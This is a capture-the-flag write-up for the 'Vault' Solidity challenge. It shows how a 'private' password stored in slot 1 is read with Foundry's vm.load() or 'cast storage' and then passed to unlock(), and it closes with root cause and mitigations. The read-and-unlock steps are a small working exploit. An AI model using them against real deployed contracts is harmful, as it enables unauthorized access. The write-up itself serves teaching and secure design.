# 08. Vault

[English](08_Vault.md) | [한국어](../ko/08_Vault.md)

## Objective

Recover the value marked `private` and use it to unlock the `Vault` contract.

## Key Concepts

- Public blockchain storage
- Solidity storage slots
- The `private` visibility modifier
- `vm.load()`
- Off-chain storage inspection

## Contract Analysis

The contract stores a lock flag followed by a private password:

```solidity
bool public locked;
bytes32 private password;
```

Solidity assigns state variables to storage slots in declaration order and packs values when possible.

- `locked` occupies part of slot 0.
- `password` is a full `bytes32` and cannot fit in the remaining 31 bytes of slot 0.
- `password` therefore begins in slot 1.

The `private` modifier prevents other Solidity contracts from referring to the variable by name. It does not encrypt the value or prevent blockchain nodes and clients from reading the underlying storage.

## Solution Flow

Foundry can read a raw storage slot with `vm.load()`:

```solidity
bytes32 slot1Data = vm.load(address(target), bytes32(uint256(1)));
```

The recovered value is then submitted to the unrestricted unlock function:

```solidity
vm.prank(player);
target.unlock(slot1Data);
```

```text
Deploy a locked Vault
        ↓
Read storage slot 1
        ↓
Recover the bytes32 password
        ↓
Player calls unlock(recoveredPassword)
        ↓
Vault compares equal values
        ↓
locked = false
```

## Foundry Test

The local test confirms the expected slot and final state:

```solidity
assertTrue(target.locked());

bytes32 slot1Data = vm.load(address(target), bytes32(uint256(1)));
assertEq(slot1Data, PASSWORD);

vm.prank(player);
target.unlock(slot1Data);

assertFalse(target.locked());
```

On a real JSON-RPC network, the equivalent investigation can be performed with an RPC storage query such as `cast storage <address> 1`.

## Root Cause

The contract treats access visibility as confidentiality. Every value stored directly in Ethereum contract storage is available to network participants, regardless of whether Solidity labels it `public`, `internal`, or `private`.

Passwords and secret keys cannot be protected by placing them in a private state variable. Hashing a low-entropy password is also insufficient because observers can test likely values offline.

## Recommended Mitigations

- Never store plaintext secrets or reusable credentials on-chain.
- Do not use knowledge of an on-chain value as authorization.
- Use signatures, ownership checks, allowlists, or cryptographic commitment schemes appropriate to the protocol.
- Separate public commitments from values that must remain off-chain until reveal time.
- Review compiler storage layout when upgradeable contracts depend on exact slot positions.

## Run the Test

```bash
forge test --match-path test/08_Vault.t.sol -vvv
```

To inspect the storage read and unlock trace:

```bash
forge test --match-path test/08_Vault.t.sol -vvvv
```

## Takeaway

`private` controls which Solidity code may access a variable by name; it does not make blockchain data secret. Treat all persistent on-chain state as publicly observable.
